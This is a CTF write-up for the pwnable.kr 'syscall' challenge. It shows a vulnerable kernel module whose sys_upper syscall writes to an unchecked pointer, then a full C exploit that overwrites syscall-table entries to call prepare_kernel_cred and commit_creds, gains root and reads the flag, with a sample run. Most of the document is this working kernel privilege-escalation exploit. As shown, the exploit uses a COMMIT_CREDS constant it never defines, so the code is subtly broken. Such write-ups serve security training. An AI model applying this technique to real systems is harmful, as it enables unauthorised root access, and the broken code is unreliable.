# Pwnable.kr syscall CTF Writeup
## Problem Description
The code provided for the challenge is as follows:

```c
// adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}

static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}

static void __exit exitmodule(void ){
	return;
}

module_init( initmodule );
module_exit( exitmodule );
```
The `sys_upper` function is a syscall that gets two args - `in` (the address of the string) and `out` (the address of the result). The function turns any string to upper case.
## Analysis
The vulnerability in this function is that there is no address checks in it, so we can write to the kernel memory by putting any address we want in `out`. 
## Exploit Code
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>

#define __NR_upper 223
#define __NR_alarm 37
#define __NR_time 201

#define SYS_CALL_TABLE 0x8000e348

int main() {
    /*
    char input[] = "hello world!";
    char output[100] = { 0 };

    long result = syscall(__NR_upper, input, output);

    if (result == 0) {
        printf("Original: %s\n", input);
        printf("Uppercase: %s\n", output);
    }
    else {
        perror("syscall failed");
    }
    */

    long result;

    // override alarm syscall to prepare_kernel_cred
    result = syscall(__NR_upper, "\x24\xf9\x03\x80", SYS_CALL_TABLE + (37 * 4));
    if (result == 0) {
        printf("Successfully overrode the alarm syscall\n");
    }
    else {
        perror("syscall failed\n");
    }

    // fill the 12 bytes before commit_creds with NOP to change its address
    result = syscall(__NR_upper, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", COMMIT_CREDS);
    if (result == 0) {
        printf("Successfully filled commit_creds with NOP\n");
    }
    else {
        perror("NOP filling failed\n");
    }
    
	// override time syscall to commit_creds
    result = syscall(__NR_upper, "\x60\xf5\x03\x80", SYS_CALL_TABLE + (201 * 4));
    if (result == 0) {
        printf("Successfully overrode the time syscall\n");
    }
    else {
        perror("syscall failed\n");
    }
    
    result = syscall(__NR_time, syscall(__NR_alarm, 0));
    if (result == 0) {
        printf("Successfully commited kernel creds!\n");
		printf("You should now have root privileges\n");

        char flag[128];
        FILE *fp = fopen("/root/flag", "r");
        if (fp == NULL)
        {
            perror("[-] Error while opening the flag file\n");
            return -1;
        }
        fgets(flag, 128, fp);
        printf("[+] Flag: %s", flag);
        fclose(fp);
    }
    else {
        perror("commiting kernel creds failed\n");
    }
    
    return 0;
}

/*
/tmp/dalal $ ./exploit
Successfully overrode the alarm syscall
Successfully filled commit_creds with NOP
Successfully overrode the time syscall
Successfully commited kernel creds!
You should now have root privileges
[+] Flag: Must_san1tize_Us3r_p0int3r
*/

```
